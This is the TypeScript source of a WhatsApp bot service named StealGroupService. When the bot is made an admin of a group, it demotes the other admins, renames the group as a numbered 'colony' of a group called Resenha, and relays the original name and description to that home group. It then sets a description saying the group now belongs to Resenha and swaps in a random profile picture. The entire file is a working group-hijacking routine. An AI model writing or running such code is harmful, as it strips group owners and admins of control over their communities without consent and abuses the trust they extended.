import type { BaileysEventMap } from '@whiskeysockets/baileys';
import type WhatsAppPort from '../ports/WhatsAppPort.js';
import MongoDBConnection from '../infra/MongoDBConnection.js';
import AxiosClient from '../infra/AxiosClient.js';

export default class StealGroupService {
  static async run(
    data: BaileysEventMap['group-participants.update'],
    whatsapp: WhatsAppPort,
  ): Promise<void> {
    if (data.action != 'promote') {
      return;
    }
    let has_promoted = false;
    const { RESENHAZORD2_JID, RESENHA_JID } = process.env;
    for (const participant of data.participants) {
      if (participant.id == RESENHAZORD2_JID) {
        has_promoted = true;
        break;
      }
    }
    if (!has_promoted) {
      return;
    }
    try {
      const { participants, ownerPn, subject, desc } = await whatsapp.groupMetadata(data.id);
      const admin_participants = participants
        .filter((participant) => participant.admin && participant.id != RESENHAZORD2_JID)
        .map((participant) => participant.id);
      const has_admin_owner = admin_participants.includes(ownerPn ?? '');
      if (has_admin_owner) {
        return;
      }
      await whatsapp.groupParticipantsUpdate(data.id, admin_participants, 'demote');
      const collection = await MongoDBConnection.getCollection<{ _id: string; number: number }>(
        'colonias',
      );
      const result = await collection.findOneAndUpdate(
        { _id: 'counter' },
        { $inc: { number: 1 } },
        { returnDocument: 'after', upsert: true },
      );
      let colony_number = result!.number;
      const roman_numerals: Record<number, string> = {
        1000: 'M',
        900: 'CM',
        500: 'D',
        400: 'CD',
        100: 'C',
        90: 'XC',
        50: 'L',
        40: 'XL',
        10: 'X',
        9: 'IX',
        5: 'V',
        4: 'IV',
        1: 'I',
      };
      let roman_number = '';
      const values = Object.keys(roman_numerals).reverse();
      for (let i = 0; i < values.length; i++) {
        const value = parseInt(values[i]);
        while (colony_number >= value) {
          roman_number += roman_numerals[value];
          colony_number -= value;
        }
      }
      await whatsapp.groupUpdateSubject(data.id, `Colônia da Resenha ${roman_number} 🐮🎣🍆`);
      await whatsapp.sendMessage(
        RESENHA_JID!,
        { text: 'Colônia obtida!\n\n' + `*${subject}\n*` + desc },
        { ephemeralExpiration: 86400 },
      );
      await whatsapp.groupUpdateDescription(data.id, 'Este grupo pertece agora a Resenha 🔒');
      const image_buffer = await AxiosClient.getBuffer('https://loremflickr.com/900/900/');
      await whatsapp.updateProfilePicture(data.id, image_buffer);
    } catch {
      return;
    }
  }
}
